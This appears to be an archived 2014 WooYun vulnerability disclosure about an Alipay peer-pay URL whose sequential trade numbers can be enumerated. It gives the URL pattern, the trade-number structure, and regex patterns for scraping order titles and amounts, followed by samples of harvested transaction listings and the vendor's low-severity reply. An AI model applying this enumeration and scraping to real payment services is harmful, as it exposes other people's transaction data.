<!doctype html>
                        <html lang="en">
                        <head>
	                        <meta charset="UTF-8">
	                        <title>		遍历支付宝订单号类型、标题及金额（可做电商大数据分析等）  </title>
	                        <link href="../css/css.css" rel="stylesheet" /> 
                        </head>
                        <body> 
                        <ul><li>标题：		遍历支付宝订单号类型、标题及金额（可做电商大数据分析等）  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/kingbase">kingbase</a> 
</li><li>提交时间：		2014-01-22 16:07</li></ul>
                        <div class="con">
                        <h2>漏洞详情</h2>
		<h3 class="detailTitle">披露状态：</h3>
		<p class="detail" style="padding-bottom:0">
					</p>
		<p class="detail">
									2014-01-22：	细节已通知厂商并且等待厂商处理中<br/>
									2014-01-27：	厂商已经确认，细节仅向厂商公开<br/>
									2014-02-06：	细节向核心白帽子及相关领域专家公开<br/>
									2014-02-16：	细节向普通白帽子公开<br/>
									2014-02-26：	细节向实习白帽子公开<br/>
									2014-03-08：	细节向公众公开<br/>
					</p>
		<h3 class="detailTitle">简要描述：</h3>

		<p class="detail">可以遍历支付宝所有订单号的类型、标题（部分）及金额</p>

				
						<h3 class="detailTitle">详细说明：</h3>
		
			<p class="detail">https://shenghuo.alipay.com/peerpaycore/tradePeerPayApply.htm?tradeNoList=2014012011001001680018854252<br />
<br />
<br />
<br />
tradeNoList的构成：日期+交易类型+编号<br />
<br />
<br />
<br />
https://shenghuo.alipay.com/peerpaycore/tradePeerPayApply.htm?tradeNoList=2014012011001001680018854255<br />
<br />
<br />
<br />
https://shenghuo.alipay.com/peerpaycore/tradePeerPayApply.htm?tradeNoList=2014012011001001680018854259<br />
<br />
<br />
<br />
我们可以通过遍历 获取大量交易的标题及金额<br />
<br />
使用正则获取返回的订单标题及金额<br />
<br />
</p><pre><code>&lt;span class=&quot;df-list-name&quot;&gt;(.*?)&lt;/span&gt;<br />
&lt;span class=&quot;df-list-price&quot;&gt;(.*?)&lt;/span&gt;</code></pre><p class='detail'><br />
<br />
</p><pre><code>4269	担保交易--惟森英伦牛皮鞋韩版潮流行鞋子男工装鞋板鞋休闲鞋...	137.94元<br />
4270	担保交易--美邦冬装男士羽绒服男装正品清仓短款加厚韩版修身...	79.00元<br />
4271	担保交易--保险-买家版运费险-正品代购Benefit贝玲...	0.60元<br />
4272	担保交易--彩票-双色球-2014009-代购-10810...	10.00元<br />
4273	担保交易--正品代购Benefit贝玲妃猪油膏/完美肌肤控...	159.40元<br />
4275	担保交易--【自动售卡】京东礼品卡 1000元 京东商城 ...	982.90元<br />
4276	担保交易--150-6588-9681 山东移动话费充值5...	49.98元<br />
4277	担保交易--绿贝俐 二代 经典柔敏修复霜30g LB-11...	235.00元<br />
4278	担保交易--最经典的崇明老白酒农家自酿糯米酒月子米酒煲汤煮...	88.00元<br />
4279	担保交易--包邮送100烟弹 怡康双杆健康戒烟产品电子烟最...	139.50元<br />
4280	担保交易--恰咖户外推拉晒衣架阳台伸缩晾衣架折叠晒被架室外...	288.00元<br />
4281	担保交易--2013 春装新款 偶像派 BIGBANG团 ...	69.00元<br />
4283	担保交易--包邮首发！2013年 家电维修 合订本（上下册...	40.00元<br />
4284	担保交易--【淘宝清仓】秋冬男士加厚保暖直筒休闲裤韩版潮英...	39.00元<br />
4285	担保交易--奥康正品男鞋秋冬真皮牛皮商务休闲皮鞋男士正装韩...	118.00元<br />
4286	担保交易--家居拖鞋女亚麻拖鞋夏季牛筋底情侣木地板防滑室内...	45.56元<br />
4287	担保交易--正品乐高创意入门款L10662小颗粒/L105...	196.00元<br />
4288	担保交易--韩国基本款深蓝宽松BF牛仔裤 男友复古显瘦直筒...	69.00元</code></pre><p class='detail'> </p>
				
									<h3 class="detailTitle">漏洞证明：</h3>

			<p class="detail"></p><p class="detail"><a href="../images/2215552647b0a29bd7c84845c90b2fd5eeee3051.jpg" target="_blank"><img src="../images/2215552647b0a29bd7c84845c90b2fd5eeee3051.jpg" alt="QQ图片20140122155434.jpg" width="600"/></a></p><p class="detail"><br />
<br />
</p><p class="detail"><a href="../images/221556121abd58dc3a62d1d3871ede9cbf548d72.jpg" target="_blank"><img src="../images/221556121abd58dc3a62d1d3871ede9cbf548d72.jpg" alt="QQ图片20140122155444.jpg" width="600"/></a></p><p class="detail"><br />
<br />
</p><p class="detail"><a href="../images/221556339a962eec51df671df67d20563c9f257c.jpg" target="_blank"><img src="../images/221556339a962eec51df671df67d20563c9f257c.jpg" alt="QQ图片20140122155449.jpg" width="600"/></a></p><p class="detail"><br />
<br />
</p><p class="detail"><a href="../images/2215565262a17c136d08546b1d3d98dc388ece76.jpg" target="_blank"><img src="../images/2215565262a17c136d08546b1d3d98dc388ece76.jpg" alt="QQ图片20140122155457.jpg" width="600"/></a></p><p class="detail"><br />
<br />
</p><pre><code>1129	即时到账--火车票	108.50元<br />
1141	即时到账--火车票	198.00元<br />
1226	即时到账--火车票	115.00元<br />
1231	即时到账--火车票	205.00元<br />
1248	即时到账--火车票	189.50元<br />
1250	即时到账--火车票	48.00元<br />
1260	即时到账--火车票	75.00元<br />
1321	即时到账--火车票	91.00元<br />
1390	即时到账--火车票	60.50元<br />
1411	即时到账--火车票	169.50元<br />
1450	即时到账--火车票	38.50元<br />
1479	即时到账--火车票	54.00元<br />
1501	即时到账--火车票	93.00元<br />
1512	即时到账--火车票	48.50元<br />
1533	即时到账--火车票	104.50元<br />
1556	即时到账--火车票	74.50元<br />
1591	即时到账--火车票	203.00元<br />
1609	即时到账--火车票	108.50元<br />
1619	即时到账--火车票	46.50元<br />
1640	即时到账--火车票	314.50元<br />
1682	即时到账--火车票	243.00元</code></pre><p class='detail'><br />
<br />
</p><pre><code>9423	即时到账--余额宝	5000.00元<br />
9436	即时到账--余额宝	20010.00元<br />
9489	即时到账--余额宝	10010.00元<br />
9521	即时到账--余额宝	2502.50元<br />
9523	即时到账--余额宝	500.50元<br />
9564	即时到账--余额宝	5005.00元<br />
9573	即时到账--余额宝	2162.16元<br />
9578	即时到账--余额宝	41025.00元<br />
9580	即时到账--余额宝	199.50元<br />
9614	即时到账--余额宝	7007.00元<br />
9651	即时到账--余额宝	1904.58元<br />
9676	即时到账--余额宝	100010.00元<br />
9692	即时到账--余额宝	100.50元<br />
9707	即时到账--余额宝	6400.00元</code></pre><p class='detail'><br />
<br />
<br />
<br />
这些能做什么呢？ 呵呵 大数据分析还是很有价值的 </p>

									<h3 class="detailTitle">修复方案：</h3>
			<p class="detail"> </p>
										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/kingbase" title="kingbase">kingbase</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-049556" title="遍历支付宝订单号类型、标题及金额（可做电商大数据分析等）">乌云</a></h3>
		<hr align="center"/>

				
			<h2>漏洞回应</h2>
			
			
															<h3 class="detailTitle">厂商回应：</h3>
						<p class="detail">危害等级：低</p>
						<p class="detail">漏洞Rank：4 </p>
													<p class="detail">确认时间：2014-01-27 09:48</p>
												<h3 class="detailTitle">厂商回复：</h3>				
						<p class="detail">非常感谢提交漏洞，我们会尽快修复，此漏洞泄露商品信息，没有泄露用户信息</p>
					

					
					
					<h3 class="detailTitle">最新状态：</h3>

											<p class="detail">暂无</p>
					

							
					
		
<hr align="center" />
<script type="text/javascript">
var bugid="49556";
var bugRating="-3";
var myRating="";
var ratingCount="0";



function ShowBugRating(k){
	var ratingItems=$(".myrating span");
	$.each(ratingItems,function(i,n){
		var nk=parseInt($(n).attr("rel"));
		if(nk<=k){
			$(n).addClass("on");
		}else{
			$(n).removeClass("on");
		}
	});
	$(".myrating span").hover(
		function(){
			$("#ratingShow").html($(this).attr("data-title"));
		},
		function(){
			$("#ratingShow").html("");
		}
	);
}
$(document).ready(function(){
	if(myRating==""){
		var ratingItems=$(".myrating span");
		$(".myrating span").hover(
			function(){
				$(this).addClass("hover");
				var k=parseInt($(this).attr("rel"));
				$.each(ratingItems,function(i,n){
					var nk=parseInt($(n).attr("rel"));
					if(nk<k) $(n).addClass("on");
					if(nk>k) $(n).removeClass("on");
				});
				$("#ratingShow").html($(this).attr("data-title"));
			},
			function(){
				$(this).removeClass("hover");
				if($("#myRating").val()==""){
					$.each(ratingItems,function(i,n){
						$(n).removeClass("on");
					});
				}
				$("#ratingShow").html("");
			}
		);

		$(".myrating span").click(function(){
			var rating=$(this).attr("rel");
			var k=parseInt($(this).attr("rel"));
			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
				//消除操作绑定
				$(".myrating span").unbind();
				re=parseInt(re);
				switch(re){
					case 1:
						$("#ratingShow").html("评分成功");
						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
						$.each(ratingItems,function(i,n){
							var nk=parseInt($(n).attr("rel"));
							if(nk<=k){
								$(n).addClass("on");
							}else{
								$(n).removeClass("on");
							}
						});
						ShowBugRating(rating);
						break;
					case 2:
						$("#ratingShow").html("请先登录");
						break;
					case 4:
						$("#ratingShow").html("已对此漏洞进行过评分");
						break;
					case 6:
						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
						break;
					default:break;
				}
			});
		});
	}else{
		if(ratingCount>2){
			ShowBugRating(bugRating);
		}else{
			ShowBugRating(-3);
		}
	}
});

</script>
<h3 class="detailTitle">漏洞评价：</h3>
                        </div>
                        </body>
                        </html>
